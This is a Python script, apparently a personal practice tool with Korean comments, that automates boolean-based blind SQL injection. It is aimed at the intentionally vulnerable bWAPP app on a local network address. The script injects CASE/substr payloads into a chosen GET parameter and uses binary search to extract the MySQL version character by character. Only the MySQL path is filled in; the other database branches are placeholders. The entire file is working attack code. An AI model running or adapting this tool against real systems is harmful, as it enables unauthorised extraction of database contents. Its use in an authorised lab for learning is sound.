# -*- coding: utf-8 -*-   
from time import sleep
import sys
# import pandas as pd
import urllib
import requests
import warnings
import argparse

warnings.filterwarnings('ignore')

message = "Iron" # is True
output_check = False
payload = ""
payloads = []
condition = ""
request_string = f"""
GET /bWAPP/sqli_1.php?title=iron1'+or+('iron'+%3d+case+when+(select+length((select+user())))>1+then+'iron'+end)+--+ HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: keep-alive
Host: 192.168.219.100:8080
Accept-Language: ko-KR,ko;q=0.9
Upgrade-Insecure-Requests: 114
Referer: http://192.168.219.100:8080/bWAPP/sqli_1.php
Cookie: PHPSESSID=a36649a968899375505575e70dac447a; security_level=0
Content-Length: 0


"""

def get_argument():
    global options
    parser = argparse.ArgumentParser()
    parser.add_argument("-s",dest="schema", help="http? https?")
    parser.add_argument("-p", dest="parameter", help="target param")
    parser.add_argument("--dbms", dest="dbms", help="Select DBMS : MySQL, Oracle, MSSQL, PostgreSQL")
    parser.add_argument("--basic", action="store_true", help="Basic info extraction")
    parser.add_argument("--dbs", action="store_true", help="Enumerate DBMS databases")
    parser.add_argument("--proxy", dest="proxy", help="Use a proxy to connect to the target URL")
    # parser.add_argument("-s", "--sleep",dest="tables", help="seleep?")
    # parser.add_argument("-s", "--columns",dest="columns", help="http? https?")
    # parser.add_argument("-s", "--schema",dest="schema", help="http? https?")
    options = parser.parse_args()
    if not options.parameter or not options.schema:
        parser.error("[-] Missing required parameters: --param, --schema are required. Use --help for more info.")
    return options

def url_encode(item):
    return urllib.parse.quote(item).replace('%20', '+').replace('%3D', '=').replace('%27', '\'').replace('%28','(').replace('%29',')').replace('%40','@').replace('%3E', '>').replace('%2C', ',').replace('%3C', '>')
    # return [urllib.parse.quote(item) for item in item]

def url_decode(item):
    return urllib.parse.unquote(item).replace('+', ' ')

def parse_request(request):
    global method, url, path, headers, data, param, condition
    setpayload() # 페이로드 셋팅
    lines = request.split("\n") # 한줄씩 쪼개서 넣기
    method, path_param, http_ver = lines[1].split() # POST /v1/groups/814a75c9-f187-48c8-8c01-a9805212db0e/files/details?AAA=aaa&BBB=bbb HTTP/2
    headers = {} # 헤더 딕셔너리
    data = {} # GET 파라미터 딕셔너리
    path, param_tmp = path_param.split("?") # param = AAA=aaa&BBB=bbb
    param = param_tmp
    
    if method == 'GET': # GET방식일경우 
        for line in lines[2:]:
            if ":" in line:
                key, value = line.split(": ")
                headers[key] = value # 딕셔너리에 {헤더 : 값}
        for get_param in param.split("&"):
            key, value = get_param.split("=")
            data[key] = value # 딕셔너리에 {파라미터 : 값}

        url = headers['Host']   
        condition = url_decode(data[options.parameter])
        print(condition)

    else: # 이외 POST 등 일경우 body 값 파싱
        headers_string, data_string = request_string.split("\n\n")
        for line in headers_string.split("\n"):
            if ":" in line:
                key, value = line.split(": ")
                headers[key] = value

        for param in data_string.split("&"):
            key, value = param.split("=")
            data[key] = value

def setpayload():   # i : 레코드 열,  j : subsing 위치 값 
    global payloads
    global output_check

    if options.dbms.lower() == 'oracle':
        if options.basic:
            if not output_check:
                print("Oracle 기본 정보 출력 Start")
                output_check = True
            payloads = f"----------------------------------------"
        elif options.dbs:
            if not output_check:
                output_check = True
                print("Oracle DB 출력 Start")
            payloads = f"----------------------------------------"
        else:
            print("Use --help for more info. (oracle)")

    if options.dbms.lower() == 'mysql':
        if options.basic:
            if not output_check:
                print("MySQL 기본 정보 출력 Start")
                output_check = True
            payloads = {
                        'len' : "iron1' or ('{message}' = case when (select length((select @@version)))>{mid} then '{message}' end) -- ",
                        'version' : "iron1' or ('{message}' = case when ascii(substr((select @@version),{substring_index},1))>{mid} then '{message}' end) -- "
                        }
        elif options.dbs:
            if not output_check:
                print("MySQL DB 출력 Start")
                output_check = True
            payloads = f"----------------------------------------"
        else:
            print("Use --help for more info. (mysql)" )

    if options.dbms.lower() == 'mssql':
        if options.basic:
            if not output_check:
                print("MSSQL 기본 정보 출력 Start")
                output_check = True
            payloads = f"----------------------------------------"

        elif options.dbs:
            if not output_check:
                print("MSSQL DB 출력 Start")
                output_check = True
            payloads = f"----------------------------------------"
        else:
            print("Use --help for more info. (mssql)")

    if options.dbms.lower() == 'postgresql':
        if options.basic:
            if not output_check:
                print("PostgreSQL 기본 정보 출력 Start")
                output_check = True
            payloads = [
                # "'||(CASE WHEN ascii(substr((select version()),{substring_index},1))>{mid} THEN '{message}' ELSE 'Characterization' END)||'"
                # ,"'||(CASE WHEN ascii(substr((select version()),{substring_index},1))>{mid} THEN '{message}' ELSE '11111' END)||'"
                ]
        elif options.dbs:
            if not output_check:
                print("PostgreSQL DB 출력 Start")
                output_check = True
            payloads = f"----------------------------------------"
        else:
            print("Use --help for more info. (postgresql)")

def recursive(list_val=None, min=None, max=None, record_index=None, substring_index=None,payload_tmp=None):
    mid = int((min+max)/2)
    payload = payload_tmp.format(substring_index=substring_index, mid=mid, message=message)
    # print(payload)
    bin_result = payload_merge(payload) # payload 삽입 및 요청
    if max - min <= 1:
        if bin_result:
            return max
        else:
            return min
    if bin_result: # 30 130 160 / 2 = 80
        return recursive(list_val, mid, max, record_index, substring_index, payload_tmp)
    else :
        return recursive(list_val, min, mid, record_index, substring_index, payload_tmp)

def payload_merge(payload_tmp):
    # print(payloads)
    data[options.parameter] = url_encode(payload_tmp) # 타겟 파라미터 값을 payload로 변경
    # print(data['title'])
    # for key, value in data.items():
    #     print("Key : {} Value : {}".format(key,value))

    params = '&'.join([f"{key}={value}" for key, value in data.items()]) # 딕셔너리 문자열로 변경 AAA=aa&BBB=bb 형식으로

    bin2_result = connection(method, url, path, params, headers) # 파싱한 Request 정보로 요청 및 참/거짓 판별
    return bin2_result # 0 : False , 1 : True

def connection(method, url, path, params, headers, data=None):
    url = f"{options.schema}://{url}{path}?{params}" # HTTP , HTTPS 입력 sechma
    proxies = {'http': options.proxy, 'https': options.proxy}
    timeout = 30
    response = requests.request(method, url, headers=headers, data=data, proxies=proxies, timeout=timeout, verify=False)

    if message in response.text: 
        return 1    # true
    else:
        return 0    # false
    
def query_start():
    parse_request(request_string)
    list_val = ['USERID'] # 컬럼명 입력
    name_str = '' # 한문자 씩 찾아서 저장할 변수
    name_tmp = [] #  name_str 에 저장된 변수를 append 할 배열변수
    name_str_list = [[0]*1 for i in list_val] # name_tmp 에 저장된 값들을 2차원 배열로 저장, 배열 선언 1 x n 배열 선언
    dic = {} # name_str_list 2차원 배열을 엑셀에 넣기위해 딕셔너리형으로 변환 해서 넣을 변수

    name_list = 1 # 데이터 갯수(행) -> 카운트 구해서 값
    name_len  = recursive(list_val[0],0,127,1,1,payloads['len'])
    
    for m in range(0, len(list_val), 1): #  테이블, 컬럼 지정
        # print(f">> {list_val[m]}")
        for record_index in range(0, name_list, 1): #   몇번째 데이터 뽑을지 씀  ex) (5, name_list, 1) -> 5번째 부터 뽑음
            for substring_index in range(0, name_len, 1): # name_len 길이만큼 조회     
                name_str += chr(recursive(list_val[m],0,127,record_index,substring_index+1,payloads['version']))
                # print(f"[*]{record_index +1}번 행 결과 : {name_str}") # 최종 추출한 데이터
                
            name_tmp.append(name_str) # tmp에 결과 값 추가


                        # else : # [j END]
                            # print(setpayload(list_val[m],32,127,i,j))
                            # print(f"{name_str}") # 한문자씩 추출한 테이터 확인
                    # name_str = ''                 

        name_str_list[m] = name_tmp # append 한 값들을 2차원 배열에 저장
        # print(f">> {m}번 배열에 데이터 저장")
        name_tmp =[] # [m END]

    print("\n>> 배열 출력")
    for i in name_str_list :
        for j in i:
            print(j,end=" ")
        print()

if __name__ == '__main__':
    print ("=================================================================")
    print ("Blind SQL Injection")
    print ("=================================================================\n")
    print ("Start!!\n")
    args = get_argument()
    print(args)

    query_start()
